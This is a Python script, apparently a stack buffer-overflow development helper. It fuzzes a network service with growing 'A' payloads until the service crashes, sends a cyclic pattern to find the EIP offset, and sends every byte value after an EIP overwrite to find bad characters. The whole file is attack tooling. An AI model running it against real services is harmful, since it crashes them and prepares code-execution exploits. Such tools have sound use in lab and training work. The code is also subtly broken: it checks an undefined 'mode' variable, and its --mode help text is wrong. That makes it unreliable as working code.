import argparse
import socket
import sys
import time

def connect(ip,port):
    s = socket.socket()
    s.connect((ip, port))
    s.settimeout(5)
    return s

def parse_bytes(b):
    tab = b.split('\\x')[1:]
    return b''.join([bytes.fromhex(x) for x in tab])

print()
parser = argparse.ArgumentParser(description='Binary fuzzer')
group1 = parser.add_argument_group('Basics')
group1.add_argument('-i', '--ip', metavar='', required=True, help='IP to fuzz')
group1.add_argument('-p', '--port', metavar='', required=True, type=int, help='Port to fuzz')
group1.add_argument('-m', '--mode', metavar='', required=True, choices=['fuzz', 'pattern', 'badchars'], help='Port to fuzz')

group2 = parser.add_argument_group('Payload customization')
group2.add_argument('-o', '--offset', metavar='', type=int, help='offset')
group2.add_argument('-b', '--before', metavar='', help='String to add before payload')
group2.add_argument('-a', '--after', metavar='', help='String to add after payload')
group2.add_argument('-x', '--badchars', metavar='', help='Already known badchars')
group2.add_argument('-e', '--eip', metavar='', help='Value to put in EIP')

group3 = parser.add_argument_group('Misc')
group3.add_argument('-r', '--reconnect', action='store_true', help='Reconnect each try')
args = parser.parse_args()

offset = args.offset or 0
before = args.before.encode() if args.before else b''
after = args.after.encode() if args.after else b'\n'
badchars = parse_bytes(args.badchars) if args.badchars else b'\x00'
eip_placeholder = parse_bytes(args.eip) if args.eip else b'\xef\xbe\xad\xde'
nb_tries = 1
fuzz_step = 100


fillchar = b'A'
allchars = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

testchars = bytes([x for x in allchars if x not in badchars])

s = connect(args.ip, args.port)

if mode == "fuzz":
    while True:
        try:

            fuzz = fillchar * (fuzz_step * nb_tries)
            print(f"\rFuzzing with {len(fuzz)} bytes")
            
            payload = before + fuzz + after
            s.send(payload)

            s.recv(1024)
            nb_tries += 1
            time.sleep(.1)

            if args.reconnect:
                s.close()
                s = connect(args.ip, args.port)

        except Exception as e:
            print(f"Crashed, fuzz = {len(fuzz)} bytes, total = {len(payload)} bytes")
            break

elif mode == "badchars":
    payload = before + (fillchar * offset) + eip_placeholder + testchars + after

    #print(f"[+] sending {payload}")
    s.send(payload)
    s.recv(1024)

elif mode == "pattern":
    payload = before + pattern + after

    #print(f"[+] sending {payload}")
    s.send(payload)
    s.recv(1024)


s.close()